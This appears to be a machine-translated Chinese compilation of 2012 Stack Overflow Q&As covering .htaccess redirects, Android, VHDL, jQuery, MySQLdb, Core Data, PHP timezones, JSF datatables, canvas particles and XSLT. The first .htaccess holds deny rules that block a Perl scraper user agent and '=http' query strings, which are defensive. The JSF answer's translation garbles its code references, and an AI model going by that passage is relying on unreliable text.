
# .htaccess - htaccess - 301重定向问题

> ID：11927141
> 
> 赞同：0
> 
> 时间：2012-08-13T01:06:31.110
> 
> 标签：.htaccess

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^jlcustompc.com [NC]
RewriteRule ^(.*)$ https://www.jlcustompc.com/$1 [L,R=301]

RewriteEngine On
RewriteCond %{HTTP_HOST} ^jlcustompc.net$ [OR]
RewriteCond %{HTTP_HOST} ^www.jlcustompc.net$
RewriteRule (.*)$ https://www.jlcustompc.com/$1 [R=301,L]

RedirectMatch 301 /contactform.php /buymypc.php

AddType application/x-httpd-php .html

AddType application/x-httpd-php .htm

RewriteCond %{HTTP_USER_AGENT} libwww-perl.* [NC,OR]

RewriteCond %{QUERY_STRING} ^(.*)=http [NC]

RewriteRule ^(.*)$ – [F,L] 
```

我希望 jlcustompc.net 重定向到[https://www.jlcustompc.com](https://www.jlcustompc.com)

这是我唯一遇到的问题。此外，如果您看到任何其他可以添加、替换或修改的内容，请告诉我。

这是我刚刚设置的虚拟主机，似乎没有按预期工作。

我认识的第一个主机毫无疑问是有效的。

```
<VirtualHost MYIP:443>
            ServerAdmin admin@jlcustompc.com
            DocumentRoot "ROOT"
            ServerName www.jlcustompc.com
            ErrorLog ERRORLOG
            SSLEngine on
            SSLProtocol all
            SSLCertificateFile "PATH"
            SSLCertificateKeyFile "PATH"
            SSLCACertificateFile "PATH"
            ServerPath "PATH"
            <Directory "PATH">
            </Directory>
</VirtualHost>  

<VirtualHost MYIP:443>
            ServerAdmin admin@jlcustompc.com
            DocumentRoot "PATH"
            ServerName www.jlcustompc.net
            ErrorLog ERRORLOG
            SSLEngine on
            SSLProtocol all
            SSLCertificateFile "PATH"
            SSLCertificateKeyFile "PATH"
            SSLCACertificateFile "PATH"
            ServerPath "PATH"
            <Directory "PATH">
            </Directory>
</VirtualHost> 

<VirtualHost MYIP:80>
            ServerAdmin admin@jlcustompc.com
            DocumentRoot "PATH"
            ServerName www.jlcustompc.net
            ErrorLog ERRORLOG
            ServerPath "PATH"
            <Directory "PATH">
            </Directory>
</VirtualHost> 

<VirtualHost MYIP:80>
            ServerAdmin admin@jlcustompc.com
            DocumentRoot "PATH"
            ServerName www.jlcustompc.com
            ErrorLog ERRORLOG
            ServerPath "PATH"
            <Directory "PATH">
            </Directory>
</VirtualHost> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:19:25.523

您可以尝试替换所有这些：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^jlcustompc.com [NC]
RewriteRule ^(.*)$ https://www.jlcustompc.com/$1 [L,R=301]

RewriteEngine On
RewriteCond %{HTTP_HOST} ^jlcustompc.net$ [OR]
RewriteCond %{HTTP_HOST} ^www.jlcustompc.net$
RewriteRule (.*)$ https://www.jlcustompc.com/$1 [R=301,L] 
```

简单地说：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} !^www.jlcustompc.com$ [NC]
RewriteRule ^(.*)$ https://www.jlcustompc.com/$1 [L,R=301] 
```

* * *

编辑：

> 我在 httpd 中添加了虚拟主机设置.....我把它们放在主题中，你可以看看。

这只是一个猜测，但您似乎没有任何要处理的虚拟主机设置`jlcustompc.net`，只有`www.jlcustompc.net`. 在`www.jlcustompc.net`虚拟主机下，您应该添加：

```
ServerAlias jlcustompc.net 
```

但看起来你也没有任何处理`jlcustompc.com`，但这似乎有效。

# android - 共享首选项返回位置不是 int

> ID：11927142
> 
> 赞同：0
> 
> 时间：2012-08-13T01:07:18.227
> 
> 标签：android

我正在使用共享首选项编辑器来存储数字以保存并在我的项目中的另一个类中使用，这是我保存数据的来源：

```
public void overallEditor(){
        SharedPreferences.Editor editor = someData.edit();
        editor.putInt("winsOverall", winsOverall);
        editor.putInt("losesOverall", losesOverall);
        editor.putInt("tiesOverall", tiesOverall);
        editor.commit();
    } 
```

这是我检索数据的来源：

```
private void getStats() {
        // TODO Auto-generated method stub
        SharedPreferences someData = getSharedPreferences(filename, 0);
        bestStreakStatsi = someData.getInt("newBestStreak", 0);
        winsOverall = someData.getInt("winsOverall", 0);
        tiesOverall = someData.getInt("tiesOverall", 0);
        losesOverall = someData.getInt("losesOverall", 0);
    } 
```

## 怎么了

![在此处输入图像描述](../Images/a6a1e7b18b20aeaff2ce129cb890d1b2.png)

这是我第一堂课的资料，如果你需要我的资料，我可以提供，但我删掉了不相关的内容：

```
int wins, ties, loses, choice, streak, bestStreak, z, winsOverall, losesOverall, tiesOverall;

    private void refresh(){
            winrep.setText(w + wins);
            loserep.setText(l + loses);
            tierep.setText(t + ties);
            SharedPreferences.Editor editor = someData.edit();
            editor.putInt("winsp", wins);
            editor.putInt("losesp", loses);
            editor.putInt("tiesp", ties);
            editor.putInt("streakp", streak);
            editor.commit();
            overallEditor();
        }
        public void overallEditor(){
            SharedPreferences.Editor editor = someData.edit();
            editor.putInt("winsOverall", winsOverall);
            editor.putInt("losesOverall", losesOverall);
            editor.putInt("tiesOverall", tiesOverall);
            editor.commit();
        } 
```

这是它应该检索整数的地方：

```
public class stats extends Activity{
    public static String filename = "stats";
    TextView bestStreakStats, overallWins, overallLoses, overallTies;
    int bestStreakStatsi, winsOverall, losesOverall, tiesOverall;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setContentView(R.layout.stats);
        initizialize();
        getStats();
        displayStats();
    }
    private void displayStats() {
        // TODO Auto-generated method stub
        bestStreakStats.setText("You best winning streak: \t" + bestStreakStatsi);
        overallWins.setText("Your overall wins: \t" + overallWins);
        overallLoses.setText("Your overall loses: \t" + overallLoses);
        overallTies.setText("Your overall ties: \t" + overallTies);
    }
    private void getStats() {
        // TODO Auto-generated method stub
        SharedPreferences someData = getSharedPreferences(filename, 0);
        bestStreakStatsi = someData.getInt("newBestStreak", 0);
        winsOverall = someData.getInt("winsOverall", 0);
        tiesOverall = someData.getInt("tiesOverall", 0);
        losesOverall = someData.getInt("losesOverall", 0);
    }
    private void initizialize() {
        // TODO Auto-generated method stub
        bestStreakStats = (TextView) findViewById(R.id.tvBestStreakStats);
        overallWins = (TextView) findViewById(R.id.tvOverallWins);
        overallLoses = (TextView) findViewById(R.id.tvOverallLoses);
        overallTies = (TextView) findViewById(R.id.tvOverallTies);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T01:21:26.507

发生这种情况的原因很可能是因为您正在这样做

```
[TextView Object].getText(); 
```

这是不正确的，应该是：

```
[TextView Object].getText().toString(); 
```

## 更新

你**真的**需要修正你的命名约定。发生这种情况的原因是您在 displayStats() 方法中显示了错误的对象。

对于一些建议，我会为您的 TextViews 推荐这种命名约定

```
TextView tx_[somename]; 
```

和你的价值观

```
int value_[somename] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T01:43:59.190

我认为您的问题是您引用了错误的变量。你是说。

```
overallWins.setText("Your overall wins: \t" + overallWins); 
```

但我认为应该是：

```
overallWins.setText("Your overall wins: \t" + winsOverall); 
```

其余部分也是如此`.setText`。看看是否有帮助。

# embedded - VHDL 中 <= 和 := 有什么区别

> ID：11927144
> 
> 赞同：11
> 
> 时间：2012-08-13T01:07:48.747
> 
> 标签：embedded, logic, vhdl, colon-equals

目前，我正在学习一些使用 VHDL 的 FPGA 设计技术，我的问题是我们是否可以在 VHDL 中互换使用 := 和 <= ，尽管我已经看到在常量声明中使用 := 和在分配中使用 <= ？提前致谢！

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-13T01:59:01.057

规则比这复杂一点，但基本上：你`<=`用来做信号分配，它在下一个增量周期生效。你`:=`用来做变量赋值，它立即发生。因此，如果您有信号，则始终使用`<=`. 如果你有一个变量，你总是使用`:=`.

在某些地方，您通常会遇到这种情况，例如初始化，`:=`甚至用于信号。

所以：

```
signal some_signal : std_logic := '0'; -- 0 initial value
...
variable some_variable : std_logic := '0'; -- 0 initial value
...
some_signal <= '1'; -- will assign 1 at the next time step (delta cycle)
...
some_variable := '1'; -- assigns 1 immediately 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-10-06T18:23:20.090

如果您使用***信号 temp:std_logic_vector***那么您将不得不使用**<=**

如果你使用***变量 temp:std_logic_vector***那么你必须使用**:=**

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-11-11T09:50:40.107

`<=`

**UseCase**：在下一个周期发生的**信号分配。**

**示例**：`signal temp:std_logic_vector`

`:=`

**UseCase**：立即发生的**变量赋值。**

**示例**：`variable temp:std_logic_vector`

* * *

除了为信号添加初始值外，您还可以使用`:=`.

# javascript - 滑动侧导航栏

> ID：11927145
> 
> 赞同：-3
> 
> 时间：2012-08-13T01:07:56.673
> 
> 标签：javascript, jquery, html, css, slidetoggle

我需要帮助制作一个向右滑动以显示更多内容的垂直导航栏。我的目标是类似于这里的蓝色条：[http](http://www.teehanlax.com/labs/) ://www.teehanlax.com/labs/ 。单击侧导航栏时，导航栏滑出（向右），单击`x`按钮时向后（向左）滑出。

我的代码是：

```
<!--Am I implementing the jQuery right?-->
<!DOCTYPE HTML> <html> <head> <title>Nishad</title> 
<link rel="stylesheet" href="style.css"> 
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"> </script> 

$(function() { $('#nav').click(function() 
{ var leftMargin = ($(this).css('margin-left') === '0px') ? '-150px' : '0px'; $(this).animate({ 'margin-left' : leftMargin }, 500); 
}); 
}); ​ 
</head> <body> <div id="wrapper">
<div id="nav"></div> 
<div id="content"></div> 
</div> </body> </html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T01:30:25.467

如果您检查该元素，您可以看到该网站正在使用负值作为导航的`margin-left`. 当您单击 时`+`，它们将设置`margin-left`为`0px`。

您可以通过附加单击事件处理程序来获得单击效果。滑动效果可以使用 jQuery 的`animate()`. 下面是我刚才提到的一个例子。

```
$(function() {

  $('#nav').click(function() {

  var leftMargin = ($(this).css('margin-left') === '0px') ? '-150px' : '0px';

  $(this).animate({ 'margin-left' : leftMargin }, 500);

  });

});
```

```
 #wrapper {
        white-space: nowrap;
    }
    #nav, #content {
        height: 500px;
        display: inline-block;
    }
    #nav {
        width: 200px;
        margin-left: -150px;
        cursor: pointer;
        background: lightgreen;
    }
    #content {
        width: 500px;
        background: lightblue;
    }
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<div id="wrapper">
        <div id="nav"></div><div id="content"></div>
    </div>
```

**[jsFiddle 演示](http://jsfiddle.net/wvFcS/)**

# python - python mysqldb 一个连接的多个游标

> ID：11927146
> 
> 赞同：28
> 
> 时间：2012-08-13T01:08:00.090
> 
> 标签：python, python-2.7, mysql-python

当您有一个连接对象时，您可以对那个单个连接创建多个游标并同时使用这些游标执行查询吗？或者每个游标会等待前一个游标完成其查询？

```
connection type: database=MySQLdb.connect(...)
cursor:          curs=database.cursor()
querying:        curs.execute("query") 
```

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-13T01:12:33.897

您需要打开多个连接。Mysqldb 是线程安全的，因此每个连接都可以访问它们各自的游标、查询和结果集，而不会影响其他连接，但是每个线程或进程都需要自己的连接。

# iphone - 使用 NSPredicate 将所有值相加

> ID：11927151
> 
> 赞同：1
> 
> 时间：2012-08-13T01:09:07.723
> 
> 标签：iphone, core-data, nspredicate

我有一个使用核心数据的程序。在循环中添加每个实体的数值时，我有点作弊。我阅读了有关使用 NSPredicate 过滤数据的信息，但我不知道如何操作数据或如何存储结果。谢谢。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-13T10:17:50.133

如果符合您的要求，您可以分两步完成。

1.  首先使用您的过滤数据`NSPredicate`并将其全部保存在`NSArray`.
2.  然后使用带有键值编码的复合运算符来获得总和。

以下是如何完成的示例。为了使其自包含，使用硬编码数组代替 Core Data：

```
// In reality this array would be the result of a Core Data query:
NSArray *numbers = @[@{@"number":@3},
                     @{@"number":@2}];

NSNumber *sum = [numbers valueForKeyPath:@"@sum.number"]; 
```

这里的诀窍是`@sum`复合​​运算符。[您可以在此处](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/KeyValueCoding/CollectionOperators.html)了解它（以及另外几个类似的运算符）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T03:06:23.727

您可以使用 NSExpressionDescription 让 Core Data 进行求和。当我做类似的事情时，我将[这篇文章用作教程。](http://web.archive.org/web/20110525095716/http://www.aderstedtsoftware.com/users/erik/weblog/4e784/)

# jquery - 使用多选时停止 jQuery 重新加载页面

> ID：11927154
> 
> 赞同：0
> 
> 时间：2012-08-13T01:10:06.977
> 
> 标签：jquery, jquery-ui

我在我的网站上的选择框中使用以下 jQuery 多选脚本，问题是当我单击选择框时，它每次都会重新加载页面，我希望它起作用的方式只是从选择中选择不同的选项框，然后单击提交按钮，只要我单击任何选择框，页面就会重新加载。

```
/* jquery.ui.muliselect.js
 *
 * URL: http://corydorning.com/projects/multiselect
 *
 * @author: Cory Dorning
 * @modified: 08/25/2011
 *
 * Multiselect is a jQuery UI widget that transforms a <select>
 * box to provide a better User Experience when you need to select
 * multiple items, without the need to use the CTRL key.
 *
 * 
 * @TODO
 * 
 *
 */

(function($) {
  $.widget('ui.multiselect', {
    _version: 0.1,

    version: function() { return this._version },

    // default options
    options: {
      label: '-- Select --',
      minWidth: 200,
      maxWidth: null,
      scroll: 0
    },

    items: [],

    _create: function() {
      var self = this,
          $select = self.element.hide(),
          items = self.items = $select.children('option').map(function(){
            return {
              label: $(this).text(),
              value: $(this).text(),
              option: this // this stores a reference of the option element it belongs to
            };
          }).get();

      var $input = self.input = $('<div class="ui-multiselect-input" />')
            .attr({
              // workaround to close menu on blur
              tabIndex: -1
            })
            .html('<span class="ui-multiselect-label" style="display: inline-block; margin: 2px; padding: 1px;">' + self.options.label + '</span>')
            .insertAfter($select)
            .autocomplete({
              delay: 0,
              minLength: 0,
              source: function(req, resp) {
                var srcItems = [];

                $.each(items, function(i, o) {
                  if (!o.option.selected) {
                    srcItems.push(o);
                  }
                });
                resp(srcItems);
              },
              select: function(ev, ui) {
                $.each(items, function(i, o) {
                  if (ui.item.option === o.option) {
                    self.select(i);
                  }
                });
              }
            })
            .addClass('ui-widget ui-widget-content ui-corner-left')
            .css({
              display: 'inline-block',
              minWidth: self.options.minWidth,
              maxWidth: self.options.maxWidth || 'auto',
              padding: 1,
              verticalAlign: 'middle'
            })
            .click(function() {
              self.button.trigger('click');
            });

      self.button = $('<button>')
        .insertAfter($input)
        .button({
          icons: {
            primary: 'ui-icon-triangle-1-s'
          },
          text: false
        })
        .removeClass('ui-corner-all')
        .addClass('ui-corner-right')
        .css({
          height: $input.outerHeight(),
          verticalAlign: 'middle'
        })
        .click(function() {
          // close if already visible
          if ( $input.autocomplete('widget').is(':visible') ) {
            $input.autocomplete('close');
            return;
          }

          // work around a bug (likely same cause as #5265)
          $(this).blur();

          // pass empty string as value to search for, displaying all results
          $input.autocomplete('search', '');
          $input.focus();
        });

      if (self.options.scroll) {
        $('.ui-autocomplete').css({
          maxHeight: self.options.scroll,
          overflowY: 'auto',
          overflowX: 'hidden',
          paddingRight: '20px'
        });
      }

    }, // _create

    destroy: function() {
      this.input.remove();
      this.button.remove();
      this.element.show();
      $.Widget.prototype.destroy.call( this );
    }, // destroy

    select: function(index) {
      var self = this,
          item = self.items[index];

      item.option.selected = true;

      $('<span class="ui-multiselect-item">' + item.label + '</span>')
        .button({
          icons: { secondary: 'ui-icon-close' }
        })
        .css({
          cursor: 'default',
          margin: 2
        })
        .children('.ui-button-text')
          .css({
            lineHeight: 'normal',
            paddingTop: 0,
            paddingBottom: 0,
            paddingLeft: '.5em'
          })
          .end()
        .children('.ui-icon-close')
          .css({
            cursor: 'pointer'
          })
          .click(function() {
            $(this).parent().remove();
            self.deselect(item);
            return false;
          })
          .end()
        .appendTo(self.input);

        self.element.trigger('change');

        self.input.children('.ui-multiselect-label').hide();
    }, // select

    deselect: function(item) {
      var self = this;

      item.option.selected = false;

      self.element.trigger('change');

      if (!self.input.children('.ui-multiselect-item').length) {
        self.input.children('.ui-multiselect-label').show();
      }
    } // deselect

  }); // $.widget('multiselect')
})(jQuery); 
```

这是我在模板 index.php 文件中使用的代码 >>

```
 <!-- Multiselect Library-->
                        <script type="text/javascript" src="./multiselect/jquery.ui.multiselect.js"></script>

    <script>
    $(function() {
      // initialize the plugin
      $('select').multiselect();

      $('.w-options').multiselect({
        label: '-- Select Your Options --',
        minWidth: 300,
        maxWidth: 400,
        scroll: 80
      });
    })
    </script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T01:31:07.647

您需要在插件文件中更新此方法...

```
.click(function() {
  // close if already visible
  if ( $input.autocomplete('widget').is(':visible') ) {
    $input.autocomplete('close');
    return;
  }

  // work around a bug (likely same cause as #5265)
  $(this).blur();

  // pass empty string as value to search for, displaying all results
  $input.autocomplete('search', '');
  $input.focus();
}); 
```

改为

```
.click(function(e) {
  e.preventDefault();
  // close if already visible
  if ( $input.autocomplete('widget').is(':visible') ) {
    $input.autocomplete('close');
    return;
  }

  // work around a bug (likely same cause as #5265)
  $(this).blur();

  // pass empty string as value to search for, displaying all results
  $input.autocomplete('search', '');
  $input.focus();
}); 
```

这应该可以防止浏览器在点击时执行任何操作

# php - PHP 默认时区配置

> ID：11927156
> 
> 赞同：8
> 
> 时间：2012-08-13T01:10:52.367
> 
> 标签：php

我今天注意到 PHP 报告的日期是错误的。

当我进入 PHP 文件尝试更改时区时，我收到一个非常丑陋的警告，说必须设置时区。

当时区设置为 UTC 但日期错误时，我没有收到任何错误。

除 UTC 之外的所有其他值都会引发错误。

这是什么？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-13T01:12:25.067

```
date.timezone = "Europe/Paris" 
```

将其放入您的 php.ini 文件中，并从[此处](http://www.php.net/manual/en/timezones.php)使用适当的时区，然后重新启动您的 HTTP 服务器。

如果您不想全局设置它，但想逐个脚本设置它，请在使用日期/时间函数的每个页面上使用此代码：

```
date_default_timezone_set('America/Los_Angeles'); 
```

与全球时区设置一样，从[此处](http://www.php.net/manual/en/timezones.php)选择您的时区。

# java - 从 JSF 中的数据表中获取选定的行数据

> ID：11927157
> 
> 赞同：2
> 
> 时间：2012-08-13T01:11:01.213
> 
> 标签：java, jakarta-ee, jsf-2, xhtml, ejb

所以，我试图在这个问题中实现 Anthony/BalusC 的方法：[如何在 JSF 数据表中获取选定的行索引？](https://stackoverflow.com/questions/2779320/how-to-get-selected-row-index-in-jsf-datatable)但无济于事。我还阅读了@BalusC 的[“使用数据表”文章](http://balusc.blogspot.com/2006/06/using-datatables.html)（一如既往地精彩），但那是为 JSF1.2 编写的，而[2.0 文章](http://balusc.blogspot.com/2010/06/benefits-and-pitfalls-of-viewscoped.html)并没有真正解决获取选定行数据的问题。当用户单击“添加到我的收藏夹”按钮时，选定的行不会传递给支持 bean，导航案例不会被遵循，并且当前页面被刷新。

有什么想法我在这里做错了吗？

这是我的支持bean：

```
 @ManagedBean(name = "selectedBean")
@RequestScoped
public class SelectedBeerBean 
{
    private List<Beer> favoriteBeers;
    private Beer selectedBeer;
    private HtmlDataTable datatableBeers;

    public HtmlDataTable getDatatableBeers() {
        return datatableBeers;
    }

    public void setDatatableBeers(HtmlDataTable datatableBeers) {
        this.datatableBeers = datatableBeers;
    }

    public String addBeer()
    {
        selectedBeer = (Beer) datatableBeers.getRowData();

        return "selectedBeer";
    }

    public List<Beer> getFavoriteBeers() {
        return favoriteBeers;
    }

    public void setFavoriteBeers(List<Beer> favoriteBeers) {
        this.favoriteBeers = favoriteBeers;
    }

    public Beer getSelectedBeer() {
        return selectedBeer;
    }

    public void setSelectedBeer(Beer selectedBeer) {
        this.selectedBeer = selectedBeer;
    }

} 
```

这是我的 xhtml 页面：

```
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:h="http://java.sun.com/jsf/html" xmlns:f="http://java.sun.com/jsf/core">
    <h:head>
        <title>Welcome to Draft Savvy, #{draftSavvyController.name}</title>        
    </h:head>
    <h:form>
    <h:body style="background-image: url(Background-Wood.png); ">
        <h3>You searched for "#{draftSavvyController.searchTerm}"</h3>
        <h4>Here are your beers</h4>

        <h:dataTable binding="#{selectedBean.datatableBeers}" value="#{draftSavvyController.beerList}" var="beer" border="1">
           <h:column>
               <f:facet name="header">
                   <h:outputText value="Logo"/>
               </f:facet>
                   <h:graphicImage url="#{beer.icon}"/>            
           </h:column>
           <h:column>
               <f:facet name="header">
                   <h:outputText value="Beer Name"/>
               </f:facet>
                   <h:outputText value="#{beer.name}"/>
           </h:column>        
           <h:column>
               <f:facet name="header">
                   <h:outputText value="Description"/>
               </f:facet>
                   <h:outputText value="#{beer.description}"/>
           </h:column>
           <h:column>
               <f:facet name="header">
                   <h:outputText value="Beer ID"/>
               </f:facet>
                   <h:outputLabel value="#{beer.id}" />
           </h:column>
           <h:column>
               <f:facet name="header">
                   <h:outputText value="Add To My Favorites"/>
               </f:facet>
               <h:commandButton value="Add Beer" action="#{selectedBean.addBeer}">
                   <f:setPropertyActionListener target="#{selectedBean.selectedBeer}" value="#{beer}" />
               </h:commandButton>            
           </h:column>
         </h:dataTable>

    </h:body>
    </h:form>
</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T09:54:10.107

> *[2.0 文章](http://balusc.blogspot.com/2010/06/benefits-and-pitfalls-of-viewscoped.html)并没有真正解决获取所选行数据的问题*

确实如此。也许您看的不够仔细，但它显示了两种获取所选行数据的方法。查看backing bean的`edit()`和`delete()`方法。第[一种方法](http://balusc.blogspot.com/2010/06/benefits-and-pitfalls-of-viewscoped.html#ReallySimpleCRUD)是通过使用新的 EL 2.2 功能将其直接传递给 action 方法`DataModel#getRowData()`，[第二种方法](http://balusc.blogspot.com/2010/06/benefits-and-pitfalls-of-viewscoped.html#ReallySimpleCRUDNowWithoutDataModel)是通过它来实现的。

* * *

> *当用户单击“添加到我的收藏夹”按钮时，所选行不会传递给支持 bean，导航案例不会被遵循，并且当前页面会刷新。*

当 的与显示带有表格的页面的初始请求期间不完全相同时`value`，就会发生这种情况。如果 bean 是请求范围的和/或依赖于请求参数，`<h:dataTable>`则反过来会发生这种情况。将 bean 放在视图范围中和/或确保您在 bean 的（后）构造函数中准备完全相同应该修复它。使用视图范围时，您应该*删除*bean的。`value``<h:dataTable>``value`*`binding``<h:dataTable>`*

 ** * *

In your particular case, with navigation to a different view involved, there's perhaps another, better, way. The concrete functional requirement is not exactly clear. Is it kind of a confirmation page? Rather use GET then. Or is it just a landing page after a successful action? Rather use POST-Redirect-GET. For another hints, see also [Communication in JSF 2.0 - Processing GET request parameters](http://balusc.blogspot.com/2011/09/communication-in-jsf-20.html#ProcessingGETRequestParameters).*

# javascript - 在 HTML5 画布中创建粒子以遵循圆形路径

> ID：11927162
> 
> 赞同：1
> 
> 时间：2012-08-13T01:11:52.367
> 
> 标签：javascript, html, canvas, cartesian, polar-coordinates

好的，所以我正在学习 HTML5，我想更新我的作品集，让它拥有一个移动的黑洞，而不是一个静态的黑洞。我本可以直接拍摄照片并在画布中旋转它，但我认为如果我在没有图像的情况下完成这一切会更好。我遇到的主要问题是我似乎无法理解如何计算（并因此更新）每个粒子沿圆形路径的路径。

我已经阅读了从极坐标转换为笛卡尔坐标的方程式，但显然我做错了。

以下是最相关的代码片段：

粒子类

```
 function particle(rad, vel, dist, angle, x, y){

   this.rad = rad;
   this.vel = vel;
   this.dist = dist;
   this.x = x;
   this.y = y;
   this.angle = angle;
} 
```

初始化正在使用的粒子的函数

```
function initParticles(parts, innerCircleRad, nbr_circles, w, h){
   var rad, vel, dist;

   for (var i = 1; i <= nbr_circles; ++i) {
      if(i < 10){
          rad = (Math.random()*2.5)+1;
          vel = (Math.random()*.5)+3;
          dist = (Math.random()*1.5) + innerCircleRad;
          angle = Math.floor(Math.random()*(360))
      }else if( i < 15){
          rad = (Math.random()*2.7)+1;
          vel = (Math.random()*.4)+2;
          dist = (Math.random()*1.5) + innerCircleRad+1;
          angle = Math.floor(Math.random()*(360))
      }else if( i < 18){
          rad = (Math.random()*2.8)+1;
          vel = (Math.random()*.3)+1;
          dist = (Math.random()*1.5) + innerCircleRad+2.5;
          angle = Math.floor(Math.random()*(360))
      }else {
          rad = (Math.random()*2.9)+1;
          vel = (Math.random()*.2)+1;
          dist = (Math.random()*1.5) + innerCircleRad+4;
          angle = Math.floor(Math.random()*(360))
      }

    var x = w/2 + Math.cos(angle) * dist;
    var y = h/2 + Math.sin(angle) * dist;
    parts[i] = new particle(rad, vel, dist, angle, x, y);       
  }
} 
```

不断调用以更新画布并绘制点的函数

```
function refresh(dc,width,height,frame_number, particles, nbr_circles) {
  dc.clearRect(0,0,width,height);  
  dc.fillStyle='#000';

  for (var i = 1; i <= nbr_circles; ++i) {
    // set up increment for new angle based on particles velocity
    var angle_incr = ((frame_number)/12.0) * Math.PI/180;
    // updated new angle, make sure it is in correct range of circle
    particles[i].angle = (angle_incr+particles[i].angle)%Math.PI/180
    // set new x and y points based on the angle change
    particles[i].x = particles[i].x + Math.cos(particles[i].angle) * particles[i].dist;
    particles[i].y = particles[i].y + Math.sin(particles[i].angle) * particles[i].dist;

    // draw tiny circle at x,y
    dc.beginPath();
    dc.arc(particles[i].x, particles[i].y, particles[i].rad, 0, 2*Math.PI, false);
    dc.fill();
  }
} 
```

我已经设置了代码，所以我可以暂停和播放，这会打开和关闭更新方法。由于某种原因，在播放（它正在更新）时，我在画布上看不到任何东西，但是当我暂停时，所有的点都会出现。所以这是第一个问题，我认为这可能与速度太高有关，所以我将其放下，但在更新期间我无法看到粒子。每次我播放然后暂停时，点就会出现，它们没有旋转而是沿着 x 轴向右移动......我输出粒子的 x 和 y 坐标，似乎只有 x 值正在更新，并且只会上升。这解释了他们的动作。

所以我的两个问题是：

1.  如何根据每个粒子与圆心的距离、速度和当前 xy 坐标，让每个粒子遵循自己的圆形路径。

2.  如何在遵循上述路径时显示粒子（由于某种原因，它们根本不显示，可能是因为它们的速度？）

我的最终目标是有一个空的内圈，然后靠近内圈半径的大量粒子快速移动。然后，当你移到黑洞的外半径时，粒子就会减少，那里的粒子移动得更慢。我整天都在寻找教程，除了圆形路径的方程之外，我没有发现太多相关的东西。但我似乎无法让它发挥作用。

任何解决类似问题的见解或参考我都会非常感激。感谢您抽时间阅读。

-艾伦

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-19T11:19:36.023

1）您必须在每个粒子中都有一个 centerX、centerY，或者让它们共享（为后者设置它们在particle.prototype 上）。那么 x,y 的公式是：

```
particles[i].x = particles[i].centerX + Math.cos(particles[i].angle) * particles[i].dist;
particles[i].y = particles[i].centerY + Math.sin(particles[i].angle) * particles[i].dist; 
```

2）你的角速度应该取决于粒子的距离。要么将角速度存储为粒子属性，要么具有 angle_incr = somefunction (particle[i].dist); 可能是 k*dist，或 k*sqrt(dist)，...

3) 对于颜色，您在 clearRect 之后绘制黑色，例如 -> red '#F00'。

4) 在 for 循环中缓存粒子[i]。( var thisPart = 粒子[i]; )

如果你喜欢，你可以使用我的粒子引擎，它又快又方便，文章在这里：

[http://gamealchemist.wordpress.com/2013/06/16/introducing-jsparkle-a-versatile-and-fast-javascript-particle-engine/](http://gamealchemist.wordpress.com/2013/06/16/introducing-jsparkle-a-versatile-and-fast-javascript-particle-engine/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-19T10:09:18.577

你可以使用质子html5粒子引擎[http://a-jie.github.io/Proton/](http://a-jie.github.io/Proton/) 非常简单！

# xslt - XSLT1.0 中的 document() 函数

> ID：11927165
> 
> 赞同：0
> 
> 时间：2012-08-13T01:12:20.577
> 
> 标签：xslt, xslt-1.0

我想在没有任何引擎的情况下直接使用 xslt 1.0 在 IE 浏览器中显示 xml。我可以从源 xml 中获取一些代码，然后我想从名为 voc.xml 的外部 xml 中获取此代码的相应显示名称。但是我无法按照这些说明获取显示名称 1.在 xsl 中定义一个文档变量

```
<xsl:variable name="voc" select="document('voc.xml')"/> 
```

2.获取我自己的xpath后面的代码，我可以得到变量'paytypecode'='01'的值
3.在voc.xml中找到对应的代码

```
<xsl:variable name='mappedpaytypecode' select="$voc//systems/system[@root='CV07.10.003医疗费用来源类别代码表']/code[@value='01']"/> 
```

4.在voc.xml中获取这个对应代码的displayName

```
<xsl:variable name='displayName_value' select="$mappedpaytypecode/@displayname"/> 
```

voc.xml 是这样的

```
<systems>
    <system codeSystemName="CV07.10.003医疗费用来源类别代码表" root="CV07.10.003医疗费用来源类别代码表">
       <code value="01" displayname="城镇职工基本医疗保险" />
       <code value="02" displayname="城镇居民基本医疗保险" />
       <code value="03" displayname="新型农村合作医疗" />
       <code value="04" displayname="贫困救助" />
       <code value="05" displayname="商业医疗保险" />
       <code value="06" displayname="全公费" />
       <code value="07" displayname="全自费" />
       <code value="99" displayname="其他" />      
  </system> 
</systems> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T08:18:49.427

我在这里看到三个问题：

1.  您的示例输入文档格式不正确。请检查 <systems> 元素的结束标记。
2.  XPath 区分大小写。在 $displayName_value 变量的选择表达式中，您使用了驼峰式 ('@displayName')，但在输入文档中，您使用了小写 ('@displayname')；
3.  您没有提及您正在测试的浏览器范围。如果是FF（桌面）或IE，你没问题。请注意，Google Chrome（桌面）不允许本地系统 XSLT。这是设计使然。我不知道移动浏览器是否支持客户端 XSLT。

## IE浏览器

不要忘记使用 node-set() 函数。参考：

